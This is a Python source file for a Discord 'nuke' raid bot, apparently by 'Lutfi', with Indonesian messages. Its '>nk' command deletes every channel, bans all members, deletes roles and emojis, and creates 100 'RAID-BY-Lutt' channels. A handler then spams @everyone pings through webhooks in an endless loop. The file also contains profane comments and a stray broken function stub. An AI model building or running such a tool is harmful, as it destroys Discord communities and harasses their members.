from typing import ContextManager
import discord
import colorama
from colorama import Fore as F, Style as S
colorama.init()
from discord.ext import commands
import json
import os
colorama.init()

r = F.RED
w = F.RESET
g = F.GREEN

def ascii():
    print('''
    Remake By : Lutfi
  _    _   _ _____ _____ ___ 
 | |  | | | |_   _|  ___|_ _|
 | |  | | | | | | | |_   | | 
 | |__| |_| | | | |  _|  | | 
 |_____\___/  |_| |_|   |___|
                             ''')

ascii()
tokeninput = f'[>] Bot Token: '
TOKEN = input(tokeninput)


os.system('cls')

def main():
    ()
    headers = {
        "authorization" : TOKEN
    }
	
os.system('cls')	
os.system('title ┼ Nuke ┼')
ascii()
antinet = commands.Bot(command_prefix='>', intents = discord.Intents.all())

@antinet.event
async def on_ready():
    await antinet.change_presence(status=discord.Status.idle, activity=discord.Game('ORANG DALAMAN Lutt'))
print('''
Command : >nk
      
Bot Status Online    
           
           ''')

antinet.remove_command('help')

@antinet.command()
async def Help(ctx, *, message):
    print(f'             {F.RESET}[{r}${F.RESET}] Command Used: >Help ')
    print(f'               {F.RESET}[{g}+{F.RESET}] Watching Text: {message}')
    print('XNXX.COM')
    await ctx.message.delete()
    await antinet.change_presence(
	
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
			
        ))

@antinet.command()
async def clear(ctx):
    os.system('cls')
    print('''

██████╗░░█████╗░████████╗
██╔══██╗██╔══██╗╚══██╔══╝
██████╦╝██║░░██║░░░██║░░░
██╔══██╗██║░░██║░░░██║░░░
██████╦╝╚█████╔╝░░░██║░░░
╚═════╝░░╚════╝░░░░╚═╝░░░

░█████╗░███╗░░██╗
██╔══██╗████╗░██║
██║░░██║██╔██╗██║
██║░░██║██║╚████║
╚█████╔╝██║░╚███║
░╚════╝░╚═╝░░╚══╝''')
    print(f'             {F.RESET}[{r}${F.RESET}] Command Used: >clear')

@antinet.command(aliases=['nuke'])
async def nk(ctx):
  await ctx.message.delete()
  print(f'             {F.RESET}[{r}${F.RESET}] Command Used: >nk')
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
      print(f'               {F.RESET}[{g}+{F.RESET}] Channel Deleted')
    except Exception as e:
      print(f'               {F.RESET}[{r}-{F.RESET}] Channel NOT Deleted')

  for member in ctx.guild.members:
    try:
      await member.ban(reason='NUKE')
      print(f'               {F.RESET}[{g}+{F.RESET}] Member Banned')
    except Exception as e:
      print(f'               {F.RESET}[{r}-{F.RESET}] Member NOT Banned')

  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f'               {F.RESET}[{g}+{F.RESET}] Role Deleted')
    except Exception as e:
      print(f'               {F.RESET}[{r}-{F.RESET}] Role NOT Deleted')

  for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
      print(f'               {F.RESET}[{g}+{F.RESET}] Emoji Deleted')
    except:
      print(f'               {F.RESET}[{r}-{F.RESET}] Emoji NOT Deleted')
	  
  for i in range(100):
    await ctx.guild.create_text_channel("RAID-BY-Lutt")
    print(f'               {F.RESET}[{g}+{F.RESET}] Created Channel')

@antinet.event
async def on_guild_channel_create(channel):
  web = await channel.create_webhook(name="ORANG DALAMNYA Lutt")
  while True:
    await web.send('@everyone @here PEMILIK SERVER INI Baik Yahahha')
    await channel.send('@everyone @here PEMILIK SERVER INI Baik yahahhaah')
#TOKEN kaga usah di isi kontol langsung play aja botnya memek
antinet.run(TOKEN)
